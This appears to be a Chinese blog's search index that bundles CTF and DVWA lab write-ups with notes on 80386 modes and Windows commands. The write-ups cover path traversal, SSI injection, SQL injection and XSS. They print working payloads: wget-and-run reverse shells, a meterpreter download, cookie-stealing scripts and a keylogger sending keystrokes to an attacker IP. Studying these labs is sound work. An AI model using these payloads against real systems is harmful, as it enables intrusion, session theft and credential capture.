<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[80x86处理器工作模式]]></title>
    <url>%2F2019%2F10%2F14%2F80x86%E5%A4%84%E7%90%86%E5%99%A8%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[80386的处理器有3种工作模式，分别是：实模式、保护模式和虚拟86模式。 实模式和虚拟86模式是为了和80386处理器兼容二设置的。 实模式下，80386就相当于一个快速的8086处理器。 保护模式是80386的主要工作模式。 在此模式下，80386可以有4GB的寻址空间，同时支持多任务，内存分页管理和优先级保护的功能。 而虚拟86模式是为了兼容8086程序而设计的，在此模式下可以支持认为切换，内存分页和优先级，但寻址方式和8086相同，寻址空间只有1MB。 实模式&emsp;&emsp;80386处理器在实模式下和8086是一样的，以 “段地址 × 16 + 偏移地址” 的方式寻址，这时它的32位地址线只使用了低20位 (8086的地址线为20根，寻址1MB)。 在实模式下，所有段都是可读，可写和可执行的。&emsp;&emsp;实模式下80386不支持优先级，所有指令都相当于工作在特权级（优先级 0），所以可以执行所有特权命令，包括读写控制寄存器CR0等。实际上。 80386就是复位或加电后，通过实模式启动并初始化控制寄存器，GTDR，LTDR，IDTR，和TR等管理寄存器，然后再加载CR0,修改控制寄存器CR0,使它的PE位为1,最后进入保护模式。 实模式下，同样使用中断向量表来中断服务。 控制寄存器(CR0,CR1,CR2,CR3) 保护模式&emsp;&emsp;在保护模式下，它的所有功能都是可用的。 32位的地址线都可供寻址，物理寻址达4GB。 支持内存分页机制，提供对虚拟内存的良好支持。&emsp;&emsp;保护模式下80386支持多任务，可以依靠一条指令实现任务切换。任务环境的保护工作是处理器自动完成的。80386还支持优先级机制（0-3)，操作系统运行在最高优先级0，应用程序运行在比较低的级别。&emsp;&emsp;DOS运行于实模式，windows运行于保护模式。 虚拟86模式&emsp;&emsp;虚拟86模式是为了在保护模式执行8086程序而设置的，就是为了向下兼容以前的程序。&emsp;&emsp;虚拟86模式是以任务形式在保护模式上执行，并且支持任务切换和内存分页。 也就是说，保护模式下，可以运行多个8086程序，采用 “段地址 × 16 + 偏移地址” 的方式形成线性地址（这里不是物理地址），寻址为1MB。很显然这里的 “1MB” 并非同一位置，而是操作系统利用分页机制分配的线性地址，然后映射到不同的物理地址。 补充&emsp;&emsp; 80386的3种模式各有特点且相互联系。实模式可以通过指令切换到保护模式，也可以通过指令从保护模式退回实模式；虚拟86模式以保护模式为基础，在保护模式和虚拟86模式之间相互切换；实模式和86模式之间不能相互直接切换。]]></content>
      <categories>
        <category>Win32汇编</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>Win32汇编</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF靶场训练-目遍历漏洞]]></title>
    <url>%2F2019%2F10%2F11%2FCTF%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[Background 路径遍历攻击（也称为目录遍历）旨在访问存储在Web根文件夹之外的文件和目录。通过槽中带有“点-斜线(..)” 序列及其变化的文件或使用绝对文件路径来应用文件的变量，可以访问存储在文件系统上的任意文件和目录，包括应用应用程序源代码、配置或关键系统文件。 这种攻击也称为“点-点斜线”、 “目录遍历”、 “目录爬升” 和 “回溯” 。 实验环境攻击机 kali linux ： 10.0.2.15靶场机器 linux ： 10.0.2.12 信息探测先对靶场机器进行信息的收集扫描开放的端口或服务 nmap -sV 10.0.2.12 扫描开放80端口http服务下的文件 1root@kali:~# dirb http://10.0.2.12/ 发现疑似管理后台的页面 通过弱口令“admin”成功登陆后台 通过漏洞扫描器owasp-zap进行扫描 发现路径遍历漏洞 1http://10.0.2.12/view.php?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd 漏洞利用此时，知道服务器存在路径遍历漏洞，而且通过弱口令进入后台想拿下该靶机的root权限，可以上传webshell，利用路径遍历执行webshell。 制作一个phpwebshell 123456root@kali:~# ls /usr/share/webshells/php/findsock.c php-findsock-shell.php qsd-php-backdoor.phpphp-backdoor.php php-reverse-shell.php simple-backdoor.phproot@kali:~# cp /usr/share/webshells/php/php-reverse-shell.php test/shell.phproot@kali:~# ls test/shell.php 设置shell脚本的IP和监听端口 利用管理后台创建一个shell.php的数据库（就是一个php后缀的文件） 创建完数据库，创建表和字段 选择字段类型为txt，默认值为一段php代码，代码如下 1&lt;?php system("cd /tmp;wget http://10.0.2.15/shell.php;chmod +x shell.php;php shell.php;") ?&gt; 代码的作用是通过system函数执行系统命令，下载一个webshell并用php执行。 所以需要仔kali搭建http服务端可以用python简易搭建 12root@kali:~/test# python -m &quot;SimpleHTTPServer&quot;Serving HTTP on 0.0.0.0 port 8000 ... 由于端口是8000，需要重新指定端口，重新创建一张表 使用nc进行监听1234端口 1234root@kali:~/test# nc -nvlp 1234Ncat: Version 7.70 ( https://nmap.org/ncat )Ncat: Listening on :::1234Ncat: Listening on 0.0.0.0:1234 利用目录遍历漏洞访问shell.php,应为是一个php文件，如果里面有php代码就会被解析执行 1http://10.0.2.12/view.php?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr/databases/shell.php 浏览器执行，卡顿后，返回监听端口查看这样就获取到靶机的www-data用户的权限]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[存储型XSS漏洞]]></title>
    <url>%2F2019%2F10%2F01%2F%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[存储型XSS，也叫持久型XSS，主要是将XSS代码发送到服务器（不管是数据库、内存还是文件系统等。），然后在下次请求页面的时候就不用带上XSS代码了。最典型的就是留言板XSS。用户提交了一条包含XSS代码的留言到数据库。当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来。浏览器发现有XSS代码，就当做正常的HTML和JS解析执行。XSS攻击就发生了。 简介存储型xss和反射型xss利用起来并没有太大什么区别，不过存储型xss是一次注入，所有访问者包括管理员都会中招。这种情况常发生在网站的留言板页面上，以下给出一个例子。 漏洞利用这是一个留言板块，输入姓名和信息即可 如果我们输入的是恶意的JavaScript代码，那又会如何？ 1&lt;script&gt;alert('hello,XSS')&lt;/script&gt; 输入的js代码执行了，并且将js代码写进数据库或文件中，每次访问或刷新页面时，都会执行我们可以在页面的源代码中看到，它已经把输入的信息当脚本执行了 我们可以利用这个漏洞盗取访问该页面的任何人的cookie，甚至是管理员的将恶意的JavaScript代码写在本地服务器(攻击者的服务器)保存为get_cookies.js 12var img = Image();img.src = "http://10.0.2.15:4445/cookies.php?cookie="+document.cookie; 开启apache服务，在本地监听4445端口 12service apache2 start # 开启apache服务nc -vlp 4445 # 监听4445端口 将代码注入目标服务器中，有时候输入会有长度限制，可以手动更改它的js代码 获取cookie 源码分析low12345678910111213141516171819202122&lt;?phpif(isset($_POST['btnSign']))&#123; $message = trim($_POST['mtxMessage']); $name = trim($_POST['txtName']); // Sanitize message input $message = stripslashes($message); $message = mysql_real_escape_string($message); // Sanitize name input $name = mysql_real_escape_string($name); $query = "INSERT INTO guestbook (comment,name) VALUES ('$message','$name');"; $result = mysql_query($query) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); &#125;?&gt; trim移除字符串两侧的字符，默认为空字符 stripslashes该函数可用于清理从数据库中或者从 HTML 表单中取回的数据，去除反斜杠； mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。 这几个函数并没有对xss攻击做有效的防护，所以基本不用绕过 medium123456789101112131415161718192021222324&lt;?phpif(isset($_POST['btnSign']))&#123; $message = trim($_POST['mtxMessage']); $name = trim($_POST['txtName']); // Sanitize message input $message = trim(strip_tags(addslashes($message))); $message = mysql_real_escape_string($message); $message = htmlspecialchars($message); // Sanitize name input $name = str_replace('&lt;script&gt;', '', $name); $name = mysql_real_escape_string($name); $query = "INSERT INTO guestbook (comment,name) VALUES ('$message','$name');"; $result = mysql_query($query) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); &#125;?&gt; addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。 strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签。 htmlspecialchars 函数把预定义的字符转换为 HTML 实体。 str_replace() 字符串替换 message变量值经过多个函数进行数据清洗，比较难绕过，但是name变量值只经过str_replace和mysql_real_escape_string两个函数的过滤mysql_real_escape_string并没有什么作用，看str_replace函数即可，它将script标签替换成空字符，这其实很容易绕过 1&lt;scr&lt;script&gt;ipt&gt;alert('hello,xss')&lt;/script&gt; high12345678910111213141516171819202122232425&lt;?phpif(isset($_POST['btnSign']))&#123; $message = trim($_POST['mtxMessage']); $name = trim($_POST['txtName']); // Sanitize message input $message = stripslashes($message); $message = mysql_real_escape_string($message); $message = htmlspecialchars($message); // Sanitize name input $name = stripslashes($name); $name = mysql_real_escape_string($name); $name = htmlspecialchars($name); $query = "INSERT INTO guestbook (comment,name) VALUES ('$message','$name');"; $result = mysql_query($query) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); &#125;?&gt; messages和name变量都做了完善的过滤，目前并没有发现可绕过的方法 注入的标签都会转成实体字符]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>XSS跨站脚本攻击</tag>
        <tag>Web渗透</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF靶场训练-SSI注入]]></title>
    <url>%2F2019%2F09%2F29%2FCTF%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83-SSI%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[Background SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。 简介&emsp;&emsp;SSI常见于shtml页面中，shtml是标准通用标记语言下的一个应用，包含有嵌入式服务器方包含命令的文本，在被传送给浏览器之前，服务器会对SHTML文档进行完全地读取、分析以及修改。&emsp;&emsp;shtml和asp 有一些相似，以shtml命名的文件里，使用了ssi的一些指令，就像asp中的指令，你可以在SHTML文件中写入SSI指令，当客户端访问这些shtml文件时，服务器端会把这些SHTML文件进行读取和解释，把SHTML文件中包含的SSI指令解释出来。 主要用途 显示服务器端环境变量&lt;#echo&gt; 12345本文档名称：&lt;!–#echo var=&quot;DOCUMENT_NAME&quot;–&gt;现在时间：&lt;!–#echo var=&quot;DATE_LOCAL&quot;–&gt;显示IP地址：&lt;! #echo var=&quot;REMOTE_ADDR&quot;–&gt; 将文本内容直接插入到文档中&lt;#include&gt; 1234567&lt;! #include file=&quot;文件名称&quot;–&gt;&lt;!--#include virtual=&quot;index.html&quot; --&gt;&lt;! #include virtual=&quot;文件名称&quot;–&gt;&lt;!--#include virtual=&quot;/www/footer.html&quot; --&gt; 显示WEB文档相关信息&lt;#flastmod #fsize&gt; (如文件制作日期/大小等) 123文件最近更新日期：&lt;! #flastmod file=&quot;文件名称&quot;–&gt;文件的长度：&lt;!–#fsize file=&quot;文件名称&quot;–&gt; 直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序) 1234567&lt;!–#exec cmd=&quot;文件名称&quot;–&gt;&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;&lt;!–#exec cgi=&quot;文件名称&quot;–&gt;&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;–&gt; 设置SSI信息显示格式&lt;#config&gt;(如文件制作日期/大小显示方式) 高级SSI可设置变量使用if条件语句。 注入命令参考：(https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection) 靶场实例攻击者：192.168.43.44靶机：192.168.43.64 信息收集nmap -sV 192.168.43.64 扫描该靶机开放的服务扫描到靶机开放了http服务 浏览器访问该站点 dirb、nikto扫描网站目录文件 查看robots.txt访问/spukcab文件夹下载配置文件，并查看 发现网站根目录：/var/www/html/convert.me/public_html 查看index.shtml文件这可能是提示信息，用这条命令查看用户密码文件 漏洞发现在index.php页面有一个表单用于提交一个IP和反馈的意见(或信息)，并转递到receipt.php页面，并最终跳转到receipt.shtml 尝试输入提示的ssi命令 1&lt;--#exec cmd=&quot;cat /etc/passwd&quot; --&gt; 发现feedback参数值过滤了exec 转换大小写（这里其实ssi命令–前要加！） 1&lt;!--#EXEC cmd=&quot;cat /etc/passwd&quot; --&gt; 成功执行 漏洞利用上传webshell获取权限 先生成webshell，IP为攻击者IP 1root@kali:~# msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.43.44 lport=4444 -f raw &gt; test/shellcode.py msf启动监听 123456msf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; set payload python/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; show optionsmsf5 exploit(multi/handler) &gt; set lhost 192.168.43.44msf5 exploit(multi/handler) &gt; show options msf5 exploit(multi/handler) &gt; run 利用ssi注入漏洞让靶机下载shellcode 攻击者机器Kali开启apache服务，将shellcode.py拷贝到/var/www/html/ 12345root@kali:~# cp test/shellcode.py /var/www/html/root@kali:~# ls /var/www/html/hack.js index.html shellcode.py whoami.exeroot@kali:~# service apache2 startroot@kali:~# service apache2 status 靶机下载shellcode 1&lt;!--#EXEC cmd=&quot;wget http://192.168.43.44/shellcode.py&quot; --&gt; 提升shellcode.py可执行权限 1&lt;!--#EXEC cmd=&quot;chmod 777 shellcode.py&quot; --&gt; 运行shellcode脚本 1&lt;!--#EXEC cmd=&quot;python shellcode.py&quot; --&gt; 运行之后，返回msf查看监听的端口 发现已经成功连接靶机 查看系统信息 进入系统shell]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[墨者-SQL注入实战-MySQL(手工注入)]]></title>
    <url>%2F2019%2F09%2F20%2F%E5%A2%A8%E8%80%85-SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98-MySQL-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[Background 网站维护人员在WEB目录中放了一个可能存在漏洞的页面。安全工程师“墨者”负责对该页面进行安全测试，看是否存在安全漏洞影响网站及服务器的运行。 了解并熟练使用手工SQL注入； 了解MySQL的相关知识； 了解SQLMAP的使用及其tamper插件的使用； 了解base64编码及解码。 判断注入点打开页面链接 观察url 1http://219.153.49.228:43444/show.php?id=MQo= 发现id的参数值MQo=是通过base64编码的1;即，id参数发送给服务器的值是需要经过base64编码的 先对url进行简单的sql注入判断（base64编码） 1231 and 1 = 1 MSBhbmQgMSA9IDE= 正常显示1 and 1 = 2 MSBhbmQgMSA9IDI= 页面不显示 这样一来可以判断出该页面是存在sql注入的 我们可以通过手工注入，也可以通过工具自动化注入 手工注入先判断select语句中的列字段个数可以用ordre by语句 123451 order by 1 MSBvcmRlciBieSAx 正常1 order by 2 MSBvcmRlciBieSAy 正常1 order by 3 MSBvcmRlciBieSAz 不正常 判断出select语句中的列字段数为2个 构造语句 12http://219.153.49.228:43444/show.php?id=0 union select 1,2 （以下是编码后的参数）http://219.153.49.228:43444/show.php?id=MCB1bmlvbiBzZWxlY3QgMSwy “0”的作用是让前面报错，让后面联合查询的内容得以显示 接下来是查询数据库的相关信息（查询数据库名和版本信息） 12http://219.153.49.228:43444/show.php?id=0 union select database(),version() http://219.153.49.228:43444/show.php?id=MCB1bmlvbiBzZWxlY3QgZGF0YWJhc2UoKSx2ZXJzaW9uKCk= 查询到数据库名是test 查询数据库表名 1234http://219.153.49.228:43444/show.php?id=0 union select group_concat(table_name),null from information_schema.tables where table_schema =&apos;test&apos;http://219.153.49.228:43444/show.php?id=MCB1bmlvbiBzZWxlY3QgZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpLG51bGwgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYSA9J3Rlc3Qn（语句也可写成0 union select table_name,null from information_schema.tables where table_schema =&apos;test&apos; limit 0,1） 查询出数据库表名data 查询test.data表中的列 1234http://219.153.49.228:43444/show.php?id=0 union select group_concat(column_name),null from information_schema.columns where table_schema =&apos;test&apos; and table_name=&apos;data&apos;http://219.153.49.228:43444/show.php?id=MCB1bmlvbiBzZWxlY3QgZ3JvdXBfY29uY2F0KGNvbHVtbl9uYW1lKSxudWxsIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfc2NoZW1hID0ndGVzdCcgYW5kIHRhYmxlX25hbWU9J2RhdGEn 查询到列名id,title,main,thekey 通过数据库表名查询字段内容 12http://219.153.49.228:43444/show.php?id=0 union select main,thekey from test.datahttp://219.153.49.228:43444/show.php?id=MCB1bmlvbiBzZWxlY3QgbWFpbix0aGVrZXkgZnJvbSB0ZXN0LmRhdGE= sqlmap自动化注入先简单测试用tamper参数加载脚本 （脚本在sqlmap/tamper文件中） 1sqlmap.py -u &quot;http://219.153.49.228:43444/show.php?id=MQo=&quot; --tamper=&quot;base64encode.py&quot; --batch 没有发现注入点，尝试提高扫描强度 1sqlmap.py -u &quot;http://219.153.49.228:43444/show.php?id=MQo=&quot; --tamper=&quot;base64encode.py&quot; --batch --level 2 发现注入点了，就直接进行爆库 爆数据库名 1sqlmap.py -u &quot;http://219.153.49.228:43444/show.php?id=MQo=&quot; --tamper=&quot;base64encode.py&quot; --batch --level 2 --dbs 爆数据库表名 1sqlmap.py -u &quot;http://219.153.49.228:43444/show.php?id=MQo=&quot; --tamper=&quot;base64encode.py&quot; --batch --level 2 -D test --tables 爆列名 1sqlmap.py -u &quot;http://219.153.49.228:43444/show.php?id=MQo=&quot; --tamper=&quot;base64encode.py&quot; --batch --level 2 -D test -T data --columns 爆字段内容 1sqlmap.py -u &quot;http://219.153.49.228:43444/show.php?id=MQo=&quot; --tamper=&quot;base64encode.py&quot; --batch --level 2 -D test -T data -C thekey --dump]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQL注入</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cmd命令大全]]></title>
    <url>%2F2019%2F09%2F17%2Fcmd%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8%2F</url>
    <content type="text"><![CDATA[网上收集一些windows 中的cmd命令 cmd命令大全（第一部分）1234winver---------检查Windows版本 wmimgmt.msc----打开windows管理体系结构(WMI)wupdmgr--------windows更新程序 wscript--------windows脚本宿主设置 write----------写字板 winmsd---------系统信息wiaacmgr-------扫描仪和照相机向导 winchat--------XP自带局域网聊天 cmd命令大全（第二部分） 12345mem.exe--------显示内存使用情况 Msconfig.exe---系统配置实用程序mplayer2-------简易widnows media player mspaint--------画图板mstsc----------远程桌面连接 mplayer2-------媒体播放机magnify--------放大镜实用程序 mmc------------打开控制台mobsync--------同步命令 cmd命令大全（第三部分）1234dxdiag---------检查DirectX信息 drwtsn32------ 系统医生devmgmt.msc--- 设备管理器 dfrg.msc-------磁盘碎片整理程序diskmgmt.msc---磁盘管理实用程序 dcomcnfg-------打开系统组件服务ddeshare-------打开DDE共享设置 dvdplay--------DVD播放器 cmd命令大全（第四部分）12345net stop messenger-----停止信使服务 net start messenger----开始信使服务notepad--------打开记事本 nslookup-------网络管理的工具向导ntbackup-------系统备份和还原 narrator-------屏幕“讲述人”ntmsmgr.msc----移动存储管理器 ntmsoprq.msc---移动存储管理员操作请求netstat -an----(TC)命令检查接口 cmd命令大全（第五部分）123456syncapp--------创建一个公文包 sysedit--------系统配置编辑器sigverif-------文件签名验证程序 sndrec32-------录音机shrpubw--------创建共享文件夹 secpol.msc-----本地安全策略syskey---------系统加密，一旦加密就不能解开，保护windows xp系统的双重密码services.msc---本地服务设置 Sndvol32-------音量控制程序sfc.exe--------系统文件检查器 sfc /scannow---windows文件保护 cmd命令大全（第六部分）12345678tsshutdn-------60秒倒计时关机命令 tourstart------xp简介（安装完成后出现的漫游xp程序）taskmgr--------任务管理器 eventvwr-------事件查看器eudcedit-------造字程序 explorer-------打开资源管理器packager-------对象包装程序 perfmon.msc----计算机性能监测程序progman--------程序管理器 regedit.exe----注册表rsop.msc-------组策略结果集 regedt32-------注册表编辑器rononce -p ----15秒关机 regsvr32 /u *.dll----停止dll文件运行 regsvr32 /u zipfldr.dll------取消ZIP支持 cmd命令大全（第七部分）1234567891011cmd.exe--------CMD命令提示符 chkdsk.exe-----Chkdsk磁盘检查 certmgr.msc----证书管理实用程序 calc-----------启动计算器charmap--------启动字符映射表 cliconfg-------SQL SERVER 客户端网络实用程序 Clipbrd--------剪贴板查看器 conf-----------启动netmeetingcompmgmt.msc---计算机管理 cleanmgr-------垃圾整理ciadv.msc------索引服务程序 osk------------打开屏幕键盘 odbcad32-------ODBC数据源管理器 oobe/msoobe /a----检查XP是否激活lusrmgr.msc----本机用户和组 logoff---------注销命令iexpress-------木马捆绑工具，系统自带 Nslookup-------IP地址侦测器fsmgmt.msc-----共享文件夹管理器 utilman--------辅助工具管理器gpedit.msc-----组策略]]></content>
      <categories>
        <category>windows基础</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS跨站脚本攻击-键盘记录器]]></title>
    <url>%2F2019%2F09%2F10%2FXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB-%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8%2F</url>
    <content type="text"><![CDATA[xss反射型漏洞利用-键盘记录器 xss漏洞原理：XSS跨站脚本攻击原理及常见攻击手段 键盘记录器 keylogger.js 1234567891011document.onkeypress = function(evt) &#123; evt = evt || window.event; key = String.fromCharCode(evt.charCode); if(key) &#123; var http = new XMLHttpRequest(); var param = encodeURI(key); http.open("POST","http://192.168.43.44/keylogger.php",true); http.setRequestHeader("Content-type","application/x-www-form-urlencoded"); http.send("key="+param); &#125;&#125; 该脚本是放在攻击者的机器中，让用户访问执行解析用的；用户执行了，在浏览器里键盘输入的字符就会发送到keylogger.php进行处理。下面就是keylogger.php的代码。 keylogger.php 1234567&lt;?php$key=$_POST['key'];$logfile="keylog.txt";$fp = fopen($logfile,"a");fwrite($fp,$key);fclose($fp);?&gt; 该php脚本是用来接受受害者用户返回的数据，即键盘输入的值，然后保存到keylog.txt文本中。所以可以事先创建keylog.txt文件总之我们我们需要准备三个文件 那么接下来就是构造有反射型xss漏洞网站的url链接，诱骗用户点击 1&lt;script src=http://192.168.43.44/keylogger.js&gt;&lt;/script&gt; 将上面的脚本插入到链接中 1http://192.168.43.117/dvwa/vulnerabilities/xss_r/?name=%3Cscript+src%3Dhttp%3A%2F%2F192.168.43.44%2Fkeylogger.js%3E%3C%2Fscript%3E# 实现的效果如下任意输入的字符都会被记录（在当前页面） 思路：诱骗用户点击url，点击之后获取攻击者的keylogger.js脚本并解析；解析之后，用户在该页面输入的任何字符会发送到keylogger.php页面进行处理，如果是登陆的站点页面，攻击者就可以轻松获得用户明文的用户名密码。 反射型xss源码分析low123456789101112131415 &lt;?phpif(!array_key_exists ("name", $_GET) || $_GET['name'] == NULL || $_GET['name'] == '')&#123; $isempty = true;&#125; else &#123; echo '&lt;pre&gt;'; echo 'Hello ' . $_GET['name']; echo '&lt;/pre&gt;'; &#125;?&gt; 从源码来看，服务端没有对输入的数据做任何的处理就直接返回给用户，这样攻击者可以非常容易地注入恶意的javascript脚本； 1&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt; medium123456789101112131415 &lt;?phpif(!array_key_exists ("name", $_GET) || $_GET['name'] == NULL || $_GET['name'] == '')&#123; $isempty = true;&#125; else &#123; echo '&lt;pre&gt;'; echo 'Hello ' . str_replace('&lt;script&gt;', '', $_GET['name']); echo '&lt;/pre&gt;'; &#125;?&gt; 将安全等级提高到medium，代码中使用str_replace()函数，作用是将输入的数据中含有”&lt;script&gt;”的标签过滤掉； 然而这样的过滤没有什么用,只要替换字母大小写即可绕过，如”&lt;scRipt&gt;”、”&lt;ScrIpt&gt;”等。或在原本的标签中再插入同样的标签，如下: 1&lt;scr&lt;script&gt;ipt&gt;alert(&apos;XSS&apos;)&lt;/script&gt; hign123456789101112131415 &lt;?php if(!array_key_exists ("name", $_GET) || $_GET['name'] == NULL || $_GET['name'] == '')&#123; $isempty = true; &#125; else &#123; echo '&lt;pre&gt;'; echo 'Hello ' . htmlspecialchars($_GET['name']); echo '&lt;/pre&gt;'; &#125;?&gt; 在高安全的代码中，使用了htmlspecialchars()对数据进行过滤清洗；htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。(这里实体的意思是：有些字符在html中有特殊含义，如&gt;或&lt; ,要想使用这些字符，就必须使用实体字符)预定义的字符是： &amp; （和号）成为 &amp; “ （双引号）成为 “ ‘ （单引号）成为 ‘ &lt; （小于）成为 &lt; &gt; （大于）成为 &gt; 使用了这个函数，脚本中标签的小于号、大于号就会被转换为&amp;lt；和&amp;gt；,并在返回时让浏览器重新解析目前来说并没有好的方法能够绕过，可以说有效的防止了xss攻击。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>XSS跨站脚本攻击</tag>
        <tag>Web渗透</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS跨站脚本攻击原理及常见攻击手段]]></title>
    <url>%2F2019%2F08%2F31%2FXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E5%8F%8A%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5%2F</url>
    <content type="text"><![CDATA[XSS（Cross Site Scripting）攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。 原理&emsp;&emsp;XSS漏洞通常是由于程序代码不完善导致的，漏洞产生的危害是用户输入的数据引起的。用户在客户端输入的恶意代码，发送给服务器，服务器端并没有对其数据进行过滤或过滤不完善，而直接返回给用户的浏览器，浏览器就会解析并执行返回的恶意代码。比如一些论坛的留言板块就可能存在XSS漏洞，常见的程序代码就是JavaScript。一般攻击者利用该漏洞进行盗取cookie、或网站重定向等操作。 XSS漏洞类型 反射型 反射型XSS，也叫非持久型XSS，是指发生请求时，XSS代码出现在请求URL中，作为参数提交到服务器，服务器解析并响应。响应结果中包含XSS代码，最后浏览器解析并执行。从概念上可以看出，反射型XSS代码是首先出现在URL中的，然后需要服务端解析，最后需要浏览器解析之后XSS代码才能够攻击。 存储型 存储型XSS，也叫持久型XSS，主要是将XSS代码发送到服务器（不管是数据库、内存还是文件系统等。），然后在下次请求页面的时候就不用带上XSS代码了。最典型的就是留言板XSS。用户提交了一条包含XSS代码的留言到数据库。当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来。浏览器发现有XSS代码，就当做正常的HTML和JS解析执行。XSS攻击就发生了。 DOM型 使用场景 直接嵌入html： 1&lt;script&gt;alert('XSS')&lt;/script&gt; 元素标签事件： 1&lt;body onload=alert('XSS')&gt; 图片标签： 1&lt;img src="javascript:alert('XSS')"&gt; 其他标签： 1&lt;iframe&gt;, &lt;div&gt;, &lt;link&gt; DOM对象，篡改页面内容 漏洞PoC如下，用户输入名字，服务器会返回用户输入的数据 漏洞利用的条件 站点存在XSS漏洞 用户点击或浏览该站点的相关链接 简单的漏洞检验方法 1&lt;script&gt;alert('XSS')&lt;/script&gt; 如果服务器没有对数据进行一定的处理，而直接返回给用户浏览器，浏览器就会直接执行 【插入一条链接】 1&lt;a href=http://www.baidu.com/&gt;click&lt;/a&gt; 当用户点击就会跳转至百度页面 【插入一张图片】 1&lt;img src=http://192.168.43.1/a.jpg onerror=alert(&apos;XSS&apos;)&gt; 如果图片不存在，出现错误就执行函数alert 【重定向】 1&lt;script&gt;window.location=&apos;http://192.168.43.44/&apos;&lt;/script&gt; 如果攻击者将脚本嵌入url中，用户点击 1http://192.168.43.117/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ewindow.location%3D%27http%3A%2F%2F192.168.43.44%2F%27%3C%2Fscript%3E# 攻击者用nc开启80端口的监听，就可以获得对方浏览器的信息 【iframe框架】 1&lt;iframe src=&apos;http://192.168.43.44/&apos; height=0 width=0&gt;&lt;/iframe&gt; 利用方法同上； 【盗取cookie】 123&lt;script&gt;new Image().src=&quot;http://192.168.43.44/a.php?output=&quot;+document.cookie;&lt;/script&gt;&lt;script&gt;window.location=&apos;http://192.168.43.44/a.php?output=&apos;+document.cookie;&lt;/script&gt; 构造一个url： 1http://192.168.43.117/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ewindow.location%3D%27http%3A%2F%2F192.168.43.44%2Fa.php%3Foutput%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E# 只要用户点击该链接就可以获得用户浏览器的cookie 【篡改页面】 